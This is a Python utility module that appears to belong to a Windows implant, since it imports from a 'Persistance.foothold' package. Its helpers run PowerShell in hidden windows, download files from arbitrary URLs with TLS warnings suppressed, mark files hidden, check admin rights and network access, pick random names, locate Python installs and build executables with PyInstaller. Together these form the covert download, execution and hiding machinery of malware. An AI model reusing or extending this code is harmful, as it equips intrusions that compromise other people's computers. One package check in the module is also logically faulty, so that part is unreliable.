import ctypes
import os
import platform
import random
import string
import subprocess
import sys
import requests
import ast
import winreg
from zipfile import ZipFile
requests.packages.urllib3.disable_warnings()
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW



def extract_zip(extracion_path : str,file_to_extract : str) -> bool:
    try:
        with ZipFile(file_to_extract) as zf:
            zf.extractall(extracion_path)
        return True
    except Exception as e:
        print(e)
        return False

def top_level_functions(body):
    return (f for f in body if isinstance(f, ast.FunctionDef))


def parse_ast(code):
    return ast.parse(code)


def is_online() -> bool:
    """check if we can access google.com. """
    try:
        x = requests.get('https://google.com', verify=False)
        return True
    except Exception as e:
        return False


def is_python_exist() -> bool:
    """check if python exist.
    //TODO:find better way to do that."""
    possible_location = ['c:/Program Files','c:/Program Files (x86)','c:/ProgramData']
    p = subprocess.run(['powershell',
                        """$p = &{python -V} 2>&1;$version = if($p -is [System.Management.Automation.ErrorRecord]){$p.Exception.Message}; $p"""],
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, startupinfo=startupinfo)
    res = p.stdout.decode()
    print(res)
    if 'python' in res.lower() and 'The term' not in res.lower() and 'find' not in res.lower() and 'not found' not in res.lower():
        print('true')
        return True
    for num in range(10, 45):
        if os.path.exists(f"C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/Python{num}/python.exe"):
            return True

    for location in possible_location:
        for file in os.listdir(location):
            if os.path.isdir(file) and 'python' in file.lower():
                return True
    return False


def install_with_pyinstaller(pyinstaller_path :str,base_dir : str,file_to_install: str,onefile=True,hidden_imports=None):
    """
    :param str pyinstaller_path: full path to pyinstaller exe
    :param str base_dir: base_dir of the file to install.
    :param str file_to_install: name of py/pyx file to install
    :param bool onefile: is onefile. default true
    :param list hidden_imports: list of hidden imports to include. can be default none
    """
    onefile_str = "--onefile" if onefile else ""
    hidden_imports_list = ''.join([f'--hidden-import={i} ' for i in hidden_imports]) if hidden_imports else ''
    run_pwsh(f"{pyinstaller_path} {onefile_str} {hidden_imports_list} {os.path.join(base_dir,file_to_install)}")
    return True

def is_admin() -> bool:
    """Returns true if user is admin."""
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def download_file(path : str,URL : str) -> bool:
    with requests.get(URL, stream=True) as r:
        r.raise_for_status()
        with open(path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                # if chunk:
                f.write(chunk)
    return True

def hide_path(p):
    return ctypes.windll.kernel32.SetFileAttributesW(p, 0x02)


def random_string(length):
    return ''.join((random.choice(string.ascii_letters) for x in range(length)))


def run_pwsh(code):
    p = subprocess.run(['powershell', code], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return p.stdout.decode()


def is_os_64bit():
    return platform.machine().endswith('64')


def find_python_path() -> str:
    from Persistance.foothold import pip_install
    base_path = f"c:/users/{os.getlogin()}/appdata/local/programs/python"
    c = 0
    found_python = []
    for folder in os.listdir(base_path):
        if '3' in folder:
            found_python.append(folder)
    if len(found_python) > 1:
        for folder in found_python:
            p = subprocess.run(['powershell',
                                f"""{os.path.join(os.path.join(base_path, folder), 'python.exe')} -m pip list """],
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True,
                               startupinfo=startupinfo)
            res = p.stdout.decode()
            if 'cryptography' and 'netifaces' in res:
                return os.path.join(base_path, folder)
            pip_install(os.path.join(os.path.join(base_path, folder), 'python.exe'))
            return os.path.join(base_path, folder)
    elif len(found_python) == 1:
        return os.path.join(base_path, found_python[0])
    else:
        sys.exit()


def is_msvc_exist():
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Wow6432Node\Microsoft\VisualStudio",0)
            return True
        except Exception as e:
            return False